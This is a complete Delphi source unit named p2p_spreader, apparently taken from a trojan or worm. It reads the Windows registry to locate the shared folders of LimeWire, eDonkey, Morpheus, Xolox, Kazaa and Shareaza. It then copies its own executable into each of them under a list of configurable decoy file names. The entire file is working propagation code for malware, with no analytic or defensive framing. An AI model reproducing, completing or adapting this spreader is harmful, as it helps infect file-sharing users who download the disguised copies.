unit p2p_spreader;

interface

uses
  Windows,
  UnitDiversos,
  UnitSettings;

  Procedure StartP2P;

implementation

Function FindEDonkey: Bool;
Begin
  Result := False;
  If lerreg(HKEY_LOCAL_MACHINE, 'Windows\CurrentVersion\Uninstall\eDonkey2000', 'UninstallString', '') <> '' Then Result := True;
End;

Function EDonkeyShare: String;
Var
  I: Word;
Begin
  Result := lerreg(HKEY_LOCAL_MACHINE, 'Windows\CurrentVersion\Uninstall\eDonkey2000', 'UninstallString', '');
  I := Pos('uninstall', Result);
  If I > 0 Then Result := Copy(Result, 2, I-2)+'\incoming';
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

Function FindMorpheus: Bool;
Begin
  Result := False;
  If lerreg(HKEY_LOCAL_MACHINE ,'\software\Morpheus', 'UninstallString', '') <> '' Then Result := True;
End;

Function MorhpeusShare: String;
Var
  i: Word;
Begin
  Result := lerreg(HKEY_LOCAL_MACHINE ,'\software\Morpheus', 'UninstallString', '');
  I := Pos('UNWISE.EXE', Result);
  If I > 0 Then Result := Copy(Result, 1, I-2) + '\My Shared Folder';
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

Function FindXolox: Bool;
Begin
  Result := False;
  If lerreg(HKEY_CURRENT_USER, '\software\Xolox', 'shareddirs', '') <> '' Then Result := True;
End;

Function XoloxShare: String;
Begin
  Result := lerreg(HKEY_CURRENT_USER, '\software\Xolox', 'shareddirs', '');
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

Function FindKazaa: Bool;
Begin
  Result := False;
  If lerreg(HKEY_CURRENT_USER, '\software\Kazaa', 'LocalContent', '') <> '' Then Result := True;
End;

Function KazaaShare: String;
Begin
  Result := lerreg(HKEY_CURRENT_USER, '\software\Kazaa', 'LocalContent', '');
  If Pos('012345:', Result) > 0 Then Result := Copy(Result, 7, Length(Result));
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

Function FindShareaza: Bool;
Begin
  Result := False;
  If lerreg(HKEY_CURRENT_USER, '\software\Shareaza', 'DownloadsPath', '') <> '' Then Result := True;
End;

Function ShareazaShare: String;
Begin
  Result := lerreg(HKEY_CURRENT_USER, '\software\Shareaza', 'DownloadsPath', '');
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

Function FindLimeWire: Bool;
Begin
  Result := False;
  If lerreg(HKEY_LOCAL_MACHINE, '\software\LimeWire', 'InstallDir', '') <> '' Then Result := True;
End;

Function LimeWireShare: String;
Begin
  Result := lerreg(HKEY_LOCAL_MACHINE, '\software\LimeWire', 'InstallDir', '');
  If Result[Length(Result)] <> '\' Then Result := Result + '\';
End;

function ExtractFileName(const Path: string): string;
var
  i, L: integer;
  Ch: Char;
begin
  L := Length(Path);
  for i := L downto 1 do
  begin
    Ch := Path[i];
    if (Ch = '\') or (Ch = '/') then
    begin
      Result := Copy(Path, i + 1, L - i);
      Break;
    end;
  end;
end;

Procedure ShareP2P(Name: String);
Begin
Try
  If FindLimeWire Then
  Begin
    CopyFile(pChar(serverfilename), pChar(LimeWireShare + ExtractFileName(Name)), False);
    if fileexists(LimeWireShare + ExtractFileName(Name)) = true then
    SetFileAttributes(PChar(LimeWireShare + ExtractFileName(Name)), FILE_ATTRIBUTE_NORMAL);
  End;
  If FindEDonkey Then
  Begin
    CopyFile(pChar(serverfilename), pChar(EDonkeyShare + ExtractFileName(Name)), False);
    if fileexists(EDonkeyShare + ExtractFileName(Name)) = true then
    SetFileAttributes(PChar(EDonkeyShare + ExtractFileName(Name)), FILE_ATTRIBUTE_NORMAL);
  End;
  If FindMorpheus Then
  Begin
    CopyFile(pChar(serverfilename), pChar(MorhpeusShare + ExtractFileName(Name)), False);
    if fileexists(MorhpeusShare + ExtractFileName(Name)) = true then
    SetFileAttributes(PChar(MorhpeusShare + ExtractFileName(Name)), FILE_ATTRIBUTE_NORMAL);
  End;
  If FindXolox Then
  Begin
    CopyFile(pChar(serverfilename), pChar(XoloxShare + ExtractFileName(Name)), False);
    if fileexists(XoloxShare + ExtractFileName(Name)) = true then
    SetFileAttributes(PChar(XoloxShare + ExtractFileName(Name)), FILE_ATTRIBUTE_NORMAL);
  End;
  If FindKazaa Then
  Begin
    CopyFile(pChar(serverfilename), pChar(KazaaShare + ExtractFileName(Name)), False);
    if fileexists(KazaaShare + ExtractFileName(Name)) = true then
    SetFileAttributes(PChar(KazaaShare + ExtractFileName(Name)), FILE_ATTRIBUTE_NORMAL);
  End;
  If FindShareaza Then
  Begin
    CopyFile(pChar(serverfilename), pChar(ShareazaShare + ExtractFileName(Name)), False);
    if fileexists(ShareazaShare + ExtractFileName(Name)) = true then
    SetFileAttributes(PChar(ShareazaShare + ExtractFileName(Name)), FILE_ATTRIBUTE_NORMAL);
  End;
Except
  Exit;
End;
End;

Procedure StartP2P;
var
  TempStr: string;
begin
  TempStr := p2pnames;

  while pos('#', TempStr) > 0 do
  begin
    ShareP2P(copy(TempStr, 1, pos('#', TempStr) - 1));
    delete(TempStr, 1, pos('#', TempStr));
  end;
end;

end.